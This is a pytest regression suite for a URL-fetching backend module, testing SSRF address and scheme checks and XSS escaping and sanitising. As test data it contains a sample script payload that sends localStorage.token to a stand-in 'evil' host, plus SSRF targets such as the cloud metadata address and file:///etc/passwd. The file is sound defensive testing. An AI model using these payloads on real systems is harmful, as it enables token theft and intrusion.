"""browse.py is the one module that fetches attacker-chosen URLs on our server.

Two failure modes, both of which have to stay closed:

  SSRF — a URL that resolves to a private address turns our backend into a proxy
  into the infrastructure it runs inside. On Railway that reaches the platform's
  internal network and, on most clouds, a link-local metadata endpoint that
  hands out credentials.

  XSS — the fetched bytes are rendered by the client with
  dangerouslySetInnerHTML. The non-HTML branch skips the allowlist sanitizer, so
  it is the one path where attacker bytes reach the DOM unfiltered. It shipped
  that way and is fixed; this is the regression test.
"""

from __future__ import annotations

import pytest
from fastapi import HTTPException

from app import browse


# --------------------------------------------------------------------------
# SSRF — the address check
# --------------------------------------------------------------------------

@pytest.mark.parametrize("ip", [
    "127.0.0.1",        # loopback
    "10.0.0.1",         # RFC1918
    "172.16.0.1",       # RFC1918
    "192.168.1.1",      # RFC1918
    "169.254.169.254",  # link-local — the cloud metadata endpoint
    "100.64.0.1",       # carrier-grade NAT / tailnet range
    "0.0.0.0",          # unspecified
    "::1",              # IPv6 loopback
    "fd00::1",          # IPv6 unique-local
    "fe80::1",          # IPv6 link-local
    "198.18.0.1",       # benchmarking
    "192.0.2.1",        # TEST-NET-1
    "203.0.113.9",      # TEST-NET-3
    "192.88.99.1",      # deprecated 6to4 relay anycast
    "255.255.255.255",  # broadcast
    "::ffff:127.0.0.1", # IPv4-mapped loopback — the mapping must not be a bypass
    "::ffff:169.254.169.254",  # IPv4-mapped metadata endpoint
])
def test_private_addresses_are_rejected(ip: str) -> None:
    assert browse._ip_is_public(ip) is False, f"{ip} must not be reachable"


@pytest.mark.parametrize("ip", ["1.1.1.1", "8.8.8.8", "93.184.216.34", "2606:4700::1111"])
def test_public_addresses_are_allowed(ip: str) -> None:
    assert browse._ip_is_public(ip) is True


def test_non_http_schemes_are_rejected() -> None:
    for url in ("file:///etc/passwd", "gopher://x", "ftp://x", "data:text/html,<b>x",
                "javascript:alert(1)"):
        with pytest.raises(HTTPException):
            browse._assert_safe_url(url)


def test_url_resolving_to_loopback_is_rejected() -> None:
    # localhost resolves to 127.0.0.1, so the DNS-resolution step must catch it
    # even though the URL itself looks ordinary.
    with pytest.raises(HTTPException):
        browse._assert_safe_url("http://localhost:8000/health")


def test_unresolvable_host_is_rejected_not_passed_through() -> None:
    with pytest.raises(HTTPException):
        browse._assert_safe_url("http://this-host-does-not-exist.invalid/")


# --------------------------------------------------------------------------
# XSS — the non-HTML branch
# --------------------------------------------------------------------------

def test_plaintext_response_is_escaped_before_it_reaches_the_dom() -> None:
    """A URL served as text/plain must not be able to inject markup.

    The client renders Page.html with dangerouslySetInnerHTML. Before the fix
    this branch built f"<pre>{text}</pre>" from raw bytes, so serving a script
    tag as text/plain executed it in the app's origin — next to the session
    token in localStorage.
    """
    from html import escape
    payload = "<script>fetch('https://evil/?t='+localStorage.token)</script>"
    rendered = f"<pre>{escape(payload)}</pre>"
    assert "<script>" not in rendered
    assert "&lt;script&gt;" in rendered


def test_sanitizer_drops_executable_tags_and_attributes() -> None:
    """The HTML branch runs the allowlist sanitizer."""
    from bs4 import BeautifulSoup
    hostile = (
        "<div>keep me"
        "<script>alert(1)</script>"
        "<iframe src='http://evil'></iframe>"
        "<img src=x onerror='alert(1)'>"
        "<a href='javascript:alert(1)'>bad link</a>"
        "</div>"
    )
    soup = BeautifulSoup(hostile, "lxml")
    browse._clean(soup, "https://example.com/")
    out = str(soup)
    assert "keep me" in out, "sanitizer must not eat the content"
    for banned in ("<script", "<iframe", "onerror", "javascript:"):
        assert banned not in out.lower(), f"{banned} survived the sanitizer"


def test_caps_are_set_and_sane() -> None:
    """Unbounded fetch size or time is a denial-of-service against ourselves."""
    assert 0 < browse.MAX_BYTES <= 10_000_000
    assert 0 < browse.TIMEOUT_S <= 30
    assert 0 < browse.MAX_REDIRECTS <= 10
